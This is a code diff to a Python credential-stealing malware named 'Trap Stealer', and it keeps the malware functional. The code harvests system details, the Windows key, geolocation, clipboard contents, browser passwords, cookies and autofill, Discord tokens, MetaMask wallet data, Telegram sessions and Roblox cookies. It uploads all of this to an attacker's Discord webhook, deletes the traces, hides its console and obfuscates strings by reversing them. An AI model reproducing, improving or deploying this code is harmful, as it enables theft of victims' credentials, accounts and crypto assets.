@@ -528,7 +528,7 @@ def globalInfo():
         except Exception as e:
             gpu = f"An error occurred: {str(e)}"
 
-    globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nProduct name : {pr}\n Windows Key `{winkey}`\n More Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU  : `{gpu}`\n`Latitude + Longitude  : `{latitude}, {longitude}`\n Installed antivirus :\n`{avss}` "
+    globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nProduct name : {pr}\n Windows Key `{winkey}`\n More Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU  : ```{gpu}``` \n`Latitude + Longitude  : ```{latitude}, {longitude}```\n Installed antivirus :\n```{avss}``` "
     if len(globalinfo) > 1750:
         globalinfo = globalinfo[:1708] + "\n**Can't show everything, too many data**"
         
@@ -833,14 +833,18 @@ def get_discord_connections(tokq):
         return connections_list
     else:
         return []
-    
+processed_id = []
 def uploadTokq(Tokq, path):
     if Tokq in processed_tokens:
         return
     
     else: processed_tokens.append(Tokq)
     username, globalusername, bio, nsfw, hashtag, ema, user_id, pfp, flags, nitro, phone = get_tokq_info(Tokq)
-
+    if user_id in processed_id:
+        return
+    
+    else: 
+        processed_id.append(Tokq)
     pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{pfp}" if pfp else "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
     back = GetBack()
     billing = GetBilling(Tokq)
@@ -1322,44 +1326,40 @@ def getPassw(path, arg):
         pass
     
 def getinfo():
-    
     try:
-        try:
-            sysinfo = systemInfo()
-        except:
-            sysinfo = "Couldn't get system information"
-        try:
-            globalinfo = globalInfo()
-        except:
-            globalinfo = "Couldn't get global information"
-            
-        try:
-            clipboardtext = clip()
-        except:
-            clipboardtext = "Couldn't get clipboard"
-        data = {
-            
-            "username": "Trap Stealer",
-            "content": "@everyone someone launched it",
-            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-            "embeds": [
-                {
-                    "title": "🍪 Trap Stealer Information",
-                    "description": f"{globalinfo}\n\n**👀 Even more information** : \n `{sysinfo}`\n\n**Startup** : `{StartupMessage}`\nClipboard text : ```{clipboardtext}```",
-                    "color": 0xffb6c1,
-                    "thumbnail": {
-                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
-                    },
-                    "footer": {
-                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            sysinfo_future = executor.submit(systemInfo)
+            globalinfo_future = executor.submit(globalInfo)
+            clipboardtext_future = executor.submit(clip)
+
+            # Attendre que toutes les tâches soient terminées
+            sysinfo = sysinfo_future.result()
+            globalinfo = globalinfo_future.result()
+            clipboardtext = clipboardtext_future.result()
+
+            data = {
+                "username": "Trap Stealer",
+                "content": "@everyone someone launched it",
+                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                "embeds": [
+                    {
+                        "title": "🍪 Trap Stealer Information",
+                        "description": f"{globalinfo}\n\n**👀 Even more information** : \n `{sysinfo}`\n\n**Startup** : `{StartupMessage}`\nClipboard text : ```{clipboardtext}```",
+                        "color": 0xffb6c1,
+                        "thumbnail": {
+                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                        },
+                        "footer": {
+                            "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                        }
                     }
-                }
-            ]
-        }
-        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-    except:
+                ]
+            }
+            LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+    except Exception as e:
         pass
+
 
 def steam_st():
     try:
@@ -1677,89 +1677,92 @@ def srcs():
 
     except Exception as e:
         pass
-def paaz():
-    
-    try:
-        global Cookies, CookiCount
+url_dict = {}
+   
+data = []
+def paaz(filetype):
+    if filetype == 'cook':
         try:
-            file = os.getenv("TEMP") + f"\wppassw.txt"
-            filename = "wppassw.txt"
-
-            
-        except:
-            file = "Couldn't get passwords"
-            filename = 'Error.txt'
-        try:
-            file2 = os.getenv("TEMP") + f"\wpcook.txt"
-            filename2 = "wpcook.txt"
-
-            
+            file = os.getenv("TEMP") + f"\wpcook.txt"
+            filename = "wpcook.txt"
         except:
             file = "Couldn't get cookies"
             filename = 'Error.txt'
+
+        s = upload_file(file)
+        url_dict['cook'] = s
+
+    if filetype == 'passw':
+        try:
+            file2 = os.getenv("TEMP") + f"\wppassw.txt"
+            filename2 = "wppassw.txt"
+        except:
+            file2 = "Couldn't get passwords"
+            filename2 = 'Error.txt'
+
+        ss = upload_file(file2)
+        url_dict['passw'] = ss
+
+    if filetype == 'autof':
         try:
             file3 = os.getenv("TEMP") + f"\wpautofill.txt"
             filename3 = "wpautofill.txt"
+        except:
+            file3 = "Couldn't get autofill"
+            filename3 = 'Error.txt'
 
-            
-        except:
-            file = "Couldn't get autofill"
-            filename = 'Error.txt'
-            
-            
-        try:
-            with open(file, 'r') as fp:
-                lines = sum(1 for line in fp)
-        except:
-            lines = 'error'
+        sss = upload_file(file3)
+        url_dict['autof'] = sss
         
-        f = upload_file(file)
-        fd = upload_file(file2)
-        ft = upload_file(file3)
-        pas = 'drowssaP'
-        data = {
-            "username": "Trap Stealer",
-            "content": "",
-            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-            "embeds": [
-                {
-                    "title": f"🍪 Trap Stealer {pas[::-1]} and cookies",
-                    "description": f"Number of {pas[::-1]} : {PasswCount}\nNumber of cookies : {CookiCount}\nNumber of autofill item : {atfiCount}",
-                    "color": 0xffb6c1,
-                    "fields": [
-                        {"name": f"{filename}", "value": f"[Click here to download]({f})"},
-                        {"name": f"{filename2}", "value": f"[Click here to download]({fd})"},
-                        {"name": f"{filename3}", "value": f"[Click here to download]({ft})"}  
-                    ],
-                    "thumbnail": {
-                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
-                    },
-                    "footer": {
-                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+    if filetype == 'uploooad':
+        try:
+            with open(os.getenv("TEMP") + f"\wpcook.txt", 'r') as fp:
+                CookiCount = sum(1 for line in fp)
+        except:
+            CookiCount = 'error'
+
+        try:
+            data = {
+                "username": "Trap Stealer",
+                "content": "",
+                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                "embeds": [
+                    {
+                        "title": f"🍪 Trap Stealer {'drowssaP'[::-1]} and cookies",
+                        "description": f"Number of {pas[::-1]} : {PasswCount}\nNumber of cookies : {CookiCount}\nNumber of autofill item : {atfiCount}",
+                        "color": 0xffb6c1,
+                        "fields": [
+                            {"name": "wpcook.txt", "value": f"[Click here to download]({url_dict.get('cook', '')})"},
+                            {"name": "wppassw.txt", "value": f"[Click here to download]({url_dict.get('passw', '')})"},
+                            {"name": "wpautofill.txt", "value": f"[Click here to download]({url_dict.get('autof', '')})"}
+                        ],
+                        "thumbnail": {
+                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                        },
+                        "footer": {
+                            "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                        }
                     }
-                }
-            ]
-        }
-        
-        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-        try:
-            try:
-                os.remove(file)
-            except:
-                pass
-            try:
-                os.remove(file2)
-            except:
-                pass
-            try:
-                os.remove(file3)
-            except:
-                pass
+                ]
+            }
+
+            LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
         except:
             pass
-    except:
-        pass
+        try:
+            file = os.getenv("TEMP") + f"\wpcook.txt"
+            file2 = os.getenv("TEMP") + f"\wppassw.txt"
+            file3 = os.getenv("TEMP") + f"\wpautofill.txt"
+
+            ss = [file, file2,file3]
+            for item in ss:
+                try:
+                    os.remove(item)
+                except:pass
+        except Exception as e:
+            pass
+
 
 
 def frcook():
@@ -2008,8 +2011,6 @@ def getCook(path, arg):
         writeforfile(Cookies, 'cook')
     except:
         pass
-    
-
             
 def GatherZips(paths1, paths2, paths3):
     thttht = []
@@ -2088,9 +2089,7 @@ def gatha():
         [f"{local}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ]
-        
     ]
-
     d = 'drocsiD'
     ddd = 'btpdrocsid'
     dd = 'drocthgiL'
@@ -2111,17 +2110,6 @@ def gatha():
     ]
     Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
     aa = []
-    if Fakegen == True:
-        us = threading.Thread(target=fakegen)
-        us.start()
-        aa.append(us)
-    else:
-        pass
-    if FakeWebhook == True:
-        wb = threading.Thread(target=webhook_tools)
-        wb.start()
-        aa.append(wb)
-        
     co = []
     try:
         if antidebugging == True:
@@ -2133,6 +2121,12 @@ def gatha():
     except:
         pass
     
+    if hidewindow == True:
+        try:
+            hide_console1()
+            hide_console2()
+        except:
+            pass
     for patt in browserPaths:
         pa = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
         pa.start()
@@ -2156,23 +2150,32 @@ def gatha():
     for patt in browserPaths:
         tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
         tokq.start()
-        co.append(tokq)
-        
-        
-    
-    
-    if hidewindow == True:
-        try:
-            hide_console1()
-            hide_console2()
-        except:
-            pass
+        aa.append(tokq)
 
-    
     getinf = threading.Thread(target=getinfo)
     getinf.start()
     aa.append(getinf)
     
+    if Fakegen == True:
+        us = threading.Thread(target=fakegen)
+        us.start()
+        aa.append(us)
+    else:
+        pass
+    if FakeWebhook == True:
+        wb = threading.Thread(target=webhook_tools)
+        wb.start()
+        aa.append(wb)
+        
+    for thread in co:
+        thread.join()
+
+    fls = ['cook', 'autof', 'passw']
+    for item in fls:
+        datas = threading.Thread(target=paaz, args=[item])
+        datas.start()
+        co.append(datas)
+        
     
     if OneTimeSteal == True:
         ots = threading.Thread(target=antispam)
@@ -2186,7 +2189,6 @@ def gatha():
     else:
         pass
 
-        
     gatz = threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram])
     gatz.start()
     aa.append(gatz)
@@ -2233,23 +2235,19 @@ def gatha():
         di = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
         di.start()
         aa.append(di)
-
-    
-    for thread in co:
-        thread.join()
-
-    paaz_thread = threading.Thread(target=paaz)
-    paaz_thread.start()
-    aa.append(paaz_thread)
-    
+        
     rbx = threading.Thread(target=cokssite)
     rbx.start()
     aa.append(rbx)
     
-    
-    for thread in aa:
+    for thread in co:
         thread.join()
-
+        
+    it = ['uploooad']
+    for item in it:
+        datas = threading.Thread(target=paaz, args=[item])
+        datas.start()
+        aa.append(datas)
 
     for thread in aa:
         thread.join()
